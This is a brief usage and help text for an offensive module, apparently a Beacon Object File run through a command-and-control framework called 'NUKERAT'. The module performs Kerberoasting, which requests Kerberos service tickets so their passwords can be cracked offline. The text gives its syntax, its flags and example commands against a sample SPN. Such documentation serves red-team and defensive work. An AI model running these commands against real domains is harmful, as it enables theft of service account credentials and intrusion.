ABOUT
    Request a Kerberos service ticket for offline cracking.
USAGE:
    bof-kerbeus-kerberoasting --- /spn:SPN [/nopreauth:USER] [/dc:DC] [/domain:DOMAIN]
    bof-kerbeus-kerberoasting --- /spn:SPN /ticket:BASE64 [/dc:DC]

EXAMPLES:
    bof-kerbeus-kerberoasting --- /spn:mssqlsvc/dc.corp.local

NUKERAT FLAGS:
    -w <seconds>    Maximum wait time until timeout
    -bg             Fork and run without waiting for output

    Example:
    bof-kerbeus-kerberoasting -w 60 --- /spn:mssqlsvc/dc.corp.local
